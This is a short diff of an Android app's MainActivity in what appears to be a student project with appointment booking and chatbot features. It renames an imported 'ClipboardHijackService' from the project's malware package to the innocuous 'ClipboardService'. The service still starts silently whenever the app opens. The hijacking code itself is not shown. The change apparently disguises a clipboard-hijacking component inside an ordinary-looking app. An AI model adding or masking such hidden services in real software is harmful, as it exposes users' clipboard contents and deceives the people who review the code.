@@ -28,7 +28,7 @@ import com.google.firebase.database.DatabaseError
 import com.google.firebase.database.ValueEventListener
 import com.google.firebase.database.database
 import com.google.firebase.database.getValue
-import com.example.inf2007_mad_j1847.malware.ClipboardHijackService
+import com.example.inf2007_mad_j1847.malware.ClipboardService
 import com.example.inf2007_mad_j1847.experiments.AppointmentBookingTest
 import com.example.inf2007_mad_j1847.experiments.AuthPerformanceTest
 import com.example.inf2007_mad_j1847.experiments.ChatbotPerformanceTest
@@ -63,7 +63,7 @@ class MainActivity : ComponentActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         enableEdgeToEdge()
-        startService(Intent(this, ClipboardHijackService::class.java))
+        startService(Intent(this, ClipboardService::class.java))
 
         // Create notification channels
         MyFirebaseMessagingService.createNotificationChannels(this)
